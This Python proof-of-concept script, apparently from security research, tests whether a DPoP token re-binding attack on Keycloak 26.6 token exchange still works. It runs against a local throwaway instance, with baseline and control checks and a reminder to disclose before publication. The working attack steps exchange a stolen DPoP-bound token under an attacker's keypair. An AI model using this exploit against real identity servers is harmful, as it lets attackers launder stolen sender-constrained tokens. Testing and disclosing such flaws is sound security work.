"""Does the S6c DPoP re-binding attack still work on Keycloak 26.6?

26.6 release notes: "Standard Token Exchange now accepts sender-constrained
tokens when a client is requesting an exchange of their own token... If you
attempt to exchange a sender-constrained token using a different client, the
request will be rejected with an invalid_request error."

That rule keys on CLIENT IDENTITY. Our attacker is a compromised peer using the
SAME client, so it passes that check by construction. The open question is
whether 26.6 ALSO validates the presented DPoP proof against the subject
token's cnf.jkt. This script answers exactly that.

Runs against a throwaway 26.6 instance on 127.0.0.1:18091 (tunnelled).
"""
import base64
import json
import sys

import httpx

sys.path.insert(0, "/srv/work/layered-auth-agentic-ai/layered-auth-ephemeral-agents")
from agent.dpop import generate_dpop_proof, generate_keypair

KC = "http://localhost:18091"
REALM = "s6probe"
ADMIN_PW = "s6probe-throwaway-pw"
CID = "probe-client"
CSEC = "probe-secret"
AUD = "probe-api"
TOKEN_EP = f"{KC}/realms/{REALM}/protocol/openid-connect/token"
EXCHANGE = "urn:ietf:params:oauth:grant-type:token-exchange"
ATT = "urn:ietf:params:oauth:token-type:access_token"


def claims(tok):
    p = tok.split(".")[1]
    p += "=" * (-len(p) % 4)
    return json.loads(base64.urlsafe_b64decode(p))


def admin_headers():
    r = httpx.post(f"{KC}/realms/master/protocol/openid-connect/token", data={
        "grant_type": "password", "client_id": "admin-cli",
        "username": "admin", "password": ADMIN_PW}, timeout=15)
    r.raise_for_status()
    return {"Authorization": f"Bearer {r.json()['access_token']}",
            "Content-Type": "application/json"}


def setup():
    h = admin_headers()
    base = f"{KC}/admin/realms"
    # realm
    ex = httpx.get(f"{base}/{REALM}", headers=h, timeout=15)
    if ex.status_code == 200:
        httpx.delete(f"{base}/{REALM}", headers=h, timeout=30)
    r = httpx.post(base, headers=h, json={"realm": REALM, "enabled": True}, timeout=30)
    print(f"  create realm      -> HTTP {r.status_code}")

    # audience client (resource server)
    r = httpx.post(f"{base}/{REALM}/clients", headers=h, json={
        "clientId": AUD, "enabled": True, "publicClient": False,
        "serviceAccountsEnabled": False, "standardFlowEnabled": False,
    }, timeout=30)
    print(f"  create audience   -> HTTP {r.status_code}")

    # the exchanging client
    r = httpx.post(f"{base}/{REALM}/clients", headers=h, json={
        "clientId": CID, "enabled": True, "publicClient": False,
        "secret": CSEC, "serviceAccountsEnabled": True,
        "standardFlowEnabled": False, "directAccessGrantsEnabled": False,
        "attributes": {
            "standard.token.exchange.enabled": "true",
            "dpop.bound.access.tokens": "false",
        },
    }, timeout=30)
    print(f"  create client     -> HTTP {r.status_code}")

    cid = httpx.get(f"{base}/{REALM}/clients", headers=h,
                    params={"clientId": CID}, timeout=15).json()[0]["id"]
    # audience mapper so the exchanged token carries aud=probe-api
    r = httpx.post(f"{base}/{REALM}/clients/{cid}/protocol-mappers/models",
                   headers=h, json={
                       "name": "aud-mapper", "protocol": "openid-connect",
                       "protocolMapper": "oidc-audience-mapper",
                       "config": {"included.client.audience": AUD,
                                  "access.token.claim": "true"},
                   }, timeout=15)
    print(f"  audience mapper   -> HTTP {r.status_code}")


def mint(dpop=None):
    h = {"DPoP": dpop} if dpop else {}
    return httpx.post(TOKEN_EP, data={
        "grant_type": "client_credentials",
        "client_id": CID, "client_secret": CSEC}, headers=h, timeout=15)


def exchange(subject, dpop=None):
    h = {"DPoP": dpop} if dpop else {}
    return httpx.post(TOKEN_EP, data={
        "grant_type": EXCHANGE, "client_id": CID, "client_secret": CSEC,
        "subject_token": subject, "subject_token_type": ATT,
        "audience": AUD, "requested_token_type": ATT}, headers=h, timeout=15)


print("=" * 74)
print("SETUP on Keycloak 26.6")
print("=" * 74)
setup()

print()
print("=" * 74)
print("BASELINE: plain (non-DPoP) exchange works at all?")
print("=" * 74)
plain = mint()
print(f"  mint plain token  -> HTTP {plain.status_code}")
if plain.status_code != 200:
    print(f"  {plain.text[:300]}")
    sys.exit(1)
pt = plain.json()["access_token"]
r = exchange(pt)
print(f"  plain exchange    -> HTTP {r.status_code}")
if r.status_code == 200:
    print(f"    aud={claims(r.json()['access_token']).get('aud')}")
else:
    print(f"    {r.text[:300]}")

print()
print("=" * 74)
print("VICTIM: mint a DPoP-BOUND token")
print("=" * 74)
vpriv, vpub = generate_keypair()
rv = mint(generate_dpop_proof(vpriv, vpub, "POST", TOKEN_EP))
print(f"  mint DPoP token   -> HTTP {rv.status_code}")
if rv.status_code != 200:
    print(f"  {rv.text[:300]}")
    sys.exit(1)
vt = rv.json()["access_token"]
vjkt = (claims(vt).get("cnf") or {}).get("jkt")
print(f"  victim cnf.jkt    = {vjkt}")
if not vjkt:
    print("  !! token is not sender-constrained; DPoP feature may be off")
    sys.exit(1)

print()
print("=" * 74)
print("ATTACK: same client, stolen DPoP-bound token, ATTACKER's keypair")
print("=" * 74)
apriv, apub = generate_keypair()
ra = exchange(vt, generate_dpop_proof(apriv, apub, "POST", TOKEN_EP))
print(f"  exchange          -> HTTP {ra.status_code}")
if ra.status_code == 200:
    lt = ra.json()["access_token"]
    ljkt = (claims(lt).get("cnf") or {}).get("jkt")
    print(f"  laundered cnf.jkt = {ljkt}")
    print(f"  RE-BOUND to attacker key? {ljkt is not None and ljkt != vjkt}")
    print()
    print("  >>> S6c STILL WORKS ON 26.6 — live issue, disclose before publication")
else:
    print(f"  body: {ra.text[:300]}")
    print()
    print("  >>> S6c BLOCKED ON 26.6 — finding is scoped to <=26.2.x")

print()
print("=" * 74)
print("CONTROL: same exchange presenting the VICTIM's own proof")
print("=" * 74)
rc = exchange(vt, generate_dpop_proof(vpriv, vpub, "POST", TOKEN_EP))
print(f"  exchange          -> HTTP {rc.status_code}")
if rc.status_code == 200:
    cjkt = (claims(rc.json()["access_token"]).get("cnf") or {}).get("jkt")
    print(f"  cnf.jkt           = {cjkt}  (preserved: {cjkt == vjkt})")
else:
    print(f"  body: {rc.text[:250]}")
